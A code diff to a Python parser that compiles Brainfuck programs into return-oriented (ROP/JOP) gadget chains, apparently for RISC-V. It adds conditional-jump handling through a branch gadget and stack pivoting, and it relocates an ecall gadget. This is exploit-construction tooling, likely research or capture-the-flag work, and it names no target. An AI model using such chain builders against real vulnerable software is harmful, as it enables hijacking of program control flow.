@@ -20,6 +20,7 @@ from bf_parser.rop_gadgets.move_sp import *
 from bf_parser.rop_gadgets.pop_s0 import *
 from bf_parser.rop_gadgets.mov_a0_a4 import *
 from bf_parser.rop_gadgets.mov_a4_a3 import *
+from bf_parser.rop_gadgets.beqz_s0 import *
 
 class BF_Parser():
     def __init__(self, bf_code):
@@ -37,10 +38,12 @@ class BF_Parser():
         self.__mov_a0_s0  = MovA0_S0()
         self.__and_a3_s0  = AndA3_S0()
         self.__store_a0   = StoreA0()
+        self.__ecall      = Ecall()
         self.__move_sp    = MoveSP()
         self.__pop_s0     = PopS0()
         self.__mov_a4_a3  = MOVA4_A3()
         self.__mov_a0_a4  = MOVA0_A4()
+        self.__beqz_s0    = Beqz_s0()
 
         # jop gadget objects
         self.__init_a3    = InitializeA3()
@@ -50,7 +53,6 @@ class BF_Parser():
         self.__store_s0   = StoreS0()
         self.__init_a7    = InitializeA5_A7()
         self.__init_args  = InitializeArgs()
-        self.__ecall      = Ecall()
 
     def get_entry_point(self):
         return self.__charger.print_vaddr() # charger address that overrides $ra
@@ -76,19 +78,21 @@ class BF_Parser():
                    self.__restore_a3.get_frame_size() + \
                    self.__and_a3_s0.get_frame_size()
 
-        elif instruction == '[':
-            return 0
-
-        elif instruction == ']':
-            return 0
+        elif instruction == '[' or instruction == ']':
+            return self.__charger.get_frame_size() + \
+                   self.__copy_a3.get_frame_size() + \
+                   self.__move_sp.get_frame_size() + \
+                   self.__mov_a4_a3.get_frame_size() + \
+                   self.__mov_a0_a4.get_frame_size() + \
+                   self.__beqz_s0.get_frame_size()
 
     def __parse_no_jumps(self, start_section, end_section, sp):
         # parse brainfuck code with no conditional jumps
 
         # provide frame for unconditional jump to this address
         rop_chain = self.__pop_s0.construct_frame(ra=self.__move_sp.get_vaddr(), \
-                                  s0=sp + 0x60 \
-                                  )
+                                                  s0=sp + self.__pop_s0.get_frame_size() + 0x50 \
+                                                  )
 
         rop_chain += self.__move_sp.construct_frame(ra=self.__charger.get_vaddr())
         new_sp = sp + self.__pop_s0.get_frame_size() + self.__move_sp.get_frame_size()
@@ -225,8 +229,38 @@ class BF_Parser():
             print("[Error] Invalid brainfuck code")
             exit(0)
 
-    def __parse_jump(self, instruction):
-        pass
+    def __parse_jump(self, sp, zero_sp, nonzero_sp):
+        backup_addr = sp + \
+                      self.__charger.get_frame_size() + \
+                      self.__copy_a3.get_frame_size() + \
+                      self.__move_sp.get_frame_size() + \
+                      self.__mov_a4_a3.get_frame_size() + \
+                      0x18 # offset for s3
+        
+        rop_chain = self.__charger.construct_frame(ra=self.__copy_a3.get_vaddr(), \
+                                                    s0=backup_addr, \
+                                                    s4=self.__beqz_s0.get_vaddr()
+                                                    )
+        
+        rop_chain += self.__copy_a3.construct_frame(ra=self.__move_sp.get_vaddr(), \
+                                                    s0=sp + self.__charger.get_frame_size() + self.__copy_a3.get_frame_size() + 0x50 \
+                                                    )
+
+        rop_chain += self.__move_sp.construct_frame(ra=self.__mov_a4_a3.get_vaddr())
+
+        rop_chain += self.__mov_a4_a3.construct_frame(ra=self.__mov_a0_a4.get_vaddr())
+
+        rop_chain += self.__mov_a0_a4.construct_frame(ra=self.__load_s0.get_vaddr(), \
+                                                      s2=self.__pop_s0.get_vaddr(), \
+                                                      s3=self.__addr_mask # will contain address written at runtime
+                                                      )
+                                                    
+        rop_chain += self.__beqz_s0.construct_frame(ra=self.__move_sp.get_vaddr(), \
+                                                    zero_sp=zero_sp, \
+                                                    nonzero_sp=nonzero_sp \
+                                                    )
+
+        return rop_chain
 
     def __parse_with_jumps(self, start_section, end_section, sp):
         for idx in range(start_section, end_section):
@@ -235,7 +269,13 @@ class BF_Parser():
                 sp2, chain2 = self.__parse_with_jumps(idx + 1, self.__brackets[idx], sp1 + self.__get_instruction_len('['))
                 sp3, chain3 = self.__parse_with_jumps(self.__brackets[idx] + 1, end_section, sp2 + self.__get_instruction_len(']'))
 
-                return sp3, chain1 + self.__parse_jump('[') + chain2 + self.__parse_jump(']') + chain3
+                open_bracket_sp = sp1 + self.__get_instruction_len('[')
+                closed_bracket_sp = sp2 + self.__get_instruction_len(']')
+
+                open_bracket_chain = self.__parse_jump(sp1, closed_bracket_sp, open_bracket_sp)
+                closed_bracket_chain = self.__parse_jump(sp2, closed_bracket_sp, open_bracket_sp)
+
+                return sp3, chain1 + open_bracket_chain + chain2 + closed_bracket_chain + chain3
         
         return self.__parse_no_jumps(start_section, end_section, sp)
 
